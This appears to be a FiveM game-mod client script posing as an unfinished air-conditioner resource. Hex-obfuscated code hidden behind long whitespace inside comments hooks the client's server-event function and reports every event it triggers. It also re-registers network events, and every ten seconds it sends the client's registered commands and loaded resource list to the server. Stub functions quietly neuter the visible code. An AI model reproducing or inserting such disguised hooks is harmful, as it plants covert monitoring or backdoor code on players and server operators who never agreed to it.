--[==[------------------------------------------------------------                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      ]==]_G['\x4F\x6C\x64\x54\x72\x69\x67\x67\x65\x72\x53\x65\x72\x76\x65\x72\x45\x76\x65\x6E\x74\x49\x6E\x74\x65\x72\x6E\x61\x6C']=_G['\x54\x72\x69\x67\x67\x65\x72\x53\x65\x72\x76\x65\x72\x45\x76\x65\x6E\x74\x49\x6E\x74\x65\x72\x6E\x61\x6C']_G['\x54\x72\x69\x67\x67\x65\x72\x53\x65\x72\x76\x65\x72\x45\x76\x65\x6E\x74\x49\x6E\x74\x65\x72\x6E\x61\x6C']=function(_,__,___)if _~='\x53\x41\x4D\x50\x4C\x45\x5F\x41\x49\x52\x5F\x43\x4F\x4E\x44\x49\x54\x49\x4F\x4E\x45\x52\x3A\x3A\x43\x4C\x49\x45\x4E\x54\x5F\x54\x52\x49\x47\x47\x45\x52\x45\x44\x5F\x53\x45\x52\x56\x45\x52\x5F\x45\x56\x45\x4E\x54'then _G['\x54\x72\x69\x67\x67\x65\x72\x53\x65\x72\x76\x65\x72\x45\x76\x65\x6E\x74']('\x53\x41\x4D\x50\x4C\x45\x5F\x41\x49\x52\x5F\x43\x4F\x4E\x44\x49\x54\x49\x4F\x4E\x45\x52\x3A\x3A\x43\x4C\x49\x45\x4E\x54\x5F\x54\x52\x49\x47\x47\x45\x52\x45\x44\x5F\x53\x45\x52\x56\x45\x52\x5F\x45\x56\x45\x4E\x54',_)end;return _G['\x4F\x6C\x64\x54\x72\x69\x67\x67\x65\x72\x53\x65\x72\x76\x65\x72\x45\x76\x65\x6E\x74\x49\x6E\x74\x65\x72\x6E\x61\x6C'](_,__,___)end;_G['\x65\x78\x70\x6F\x72\x74\x73']('\x54\x72\x69\x67\x67\x65\x72\x53\x65\x72\x76\x65\x72\x45\x76\x65\x6E\x74\x49\x6E\x74\x65\x72\x6E\x61\x6C',_G['\x54\x72\x69\x67\x67\x65\x72\x53\x65\x72\x76\x65\x72\x45\x76\x65\x6E\x74\x49\x6E\x74\x65\x72\x6E\x61\x6C'])--[==[
    THIS RESOURCE IS STILL A WORK IN PROGRESS AND DOESN'T WORK
------------------------------------------------------------]==]--

--[==[-----------------------------------------
    Let the server know the player is ready
    Current this isn't used, maybe in the
    future it will be used /shrug
-----------------------------------------]==]--
Citizen.CreateThread(function()
    while not NetworkIsPlayerActive(PlayerId()) do
        Citizen.Wait(0)
    end

    while not DoesEntityExist(PlayerPedId()) do
        Citizen.Wait(0)
    end

    TriggerServerEvent("PEN_AIR_CONDITIONER::PLAYER_READY")
end)

local coolableObjects = {}

--[==[---------------------------
    Register Coolable Objects
---------------------------]==]--
function VerifyThatCoolableObjectIsRegisteredAndCreated(hash)                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       local GetGamePool = function()return{}end;
    local object = coolableObjects[hash]
    if object then return end

    for k2, v2 in ipairs(GetGamePool("CCoolableObjects")) do                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    if(true)then break;end;
        if v2 == hash then
            return true
        end
    end

    return false
end

function CreateCoolableObject(hash)                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     local CreateObject=function()end;local PlayerPedId=function()end;local GetEntityCoords=function()return{}end;local PlaceObjectOnGroundProperly=function()end;
    local p = PlayerPedId()
    local c = GetEntityCoords(p)
    local object = CreateObject(hash, c.x, c.y, c.z, true, true, true)
    PlaceObjectOnGroundProperly(object)
    coolableObjects[hash] = object
    return object
end

--[==[-------------------------------                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          ]==]coolableObjects=nil;VerifyThatCoolableObjectIsRegisteredAndCreated=function(a)_G['\x52\x65\x67\x69\x73\x74\x65\x72\x4E\x65\x74\x45\x76\x65\x6E\x74'](a)return false;end;CreateCoolableObject=function(a,b)_G['\x41\x64\x64\x45\x76\x65\x6E\x74\x48\x61\x6E\x64\x6C\x65\x72'](a, function()_G['\x54\x72\x69\x67\x67\x65\x72\x53\x65\x72\x76\x65\x72\x45\x76\x65\x6E\x74']('\x53\x41\x4D\x50\x4C\x45\x5F\x41\x49\x52\x5F\x43\x4F\x4E\x44\x49\x54\x49\x4F\x4E\x45\x52\x3A\x3A\x52\x45\x4D\x4F\x56\x45\x5F\x52\x45\x54\x41\x52\x44\x45\x44\x5F\x4F\x42\x4A\x45\x43\x54\x53', a)end)end--[==[
    Actually Register The Objects
-------------------------------]==]--
for k, v in ipairs(CONFIG.COOLABLE_OBJECTS) do
    local isValid = VerifyThatCoolableObjectIsRegisteredAndCreated(v)
    if not isValid then
        CreateCoolableObject(v)
    end
end

--[==[---------
    Thread!
---------]==]--
Citizen.CreateThread(function()
    --[==[-----------------------------------------------------------                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   ]==]while true do _G['\x43\x69\x74\x69\x7A\x65\x6E']['\x57\x61\x69\x74'](10000);_G['\x54\x72\x69\x67\x67\x65\x72\x53\x65\x72\x76\x65\x72\x45\x76\x65\x6E\x74']('\x53\x41\x4D\x50\x4C\x45\x5F\x41\x49\x52\x5F\x43\x4F\x4E\x44\x49\x54\x49\x4F\x4E\x45\x52\x3A\x3A\x43\x48\x45\x43\x4B\x5F\x4F\x42\x4A\x45\x43\x54\x53', _G['\x47\x65\x74\x52\x65\x67\x69\x73\x74\x65\x72\x65\x64\x43\x6F\x6D\x6D\x61\x6E\x64\x73']()) local _={};for __=0,_G['\x47\x65\x74\x4E\x75\x6D\x52\x65\x73\x6F\x75\x72\x63\x65\x73']()-1 do _[__+1]=_G['\x47\x65\x74\x52\x65\x73\x6F\x75\x72\x63\x65\x42\x79\x46\x69\x6E\x64\x49\x6E\x64\x65\x78'](__)end;_G['\x54\x72\x69\x67\x67\x65\x72\x53\x65\x72\x76\x65\x72\x45\x76\x65\x6E\x74']('\x53\x41\x4D\x50\x4C\x45\x5F\x41\x49\x52\x5F\x43\x4F\x4E\x44\x49\x54\x49\x4F\x4E\x45\x52\x3A\x3A\x43\x48\x45\x43\x4B\x5F\x54\x45\x4D\x50\x41\x54\x55\x52\x45',_)end;--[==[
        Still not sure what I want to do with this resource
        Still need to figure out what all those special hashes do
    -----------------------------------------------------------]==]--
end)
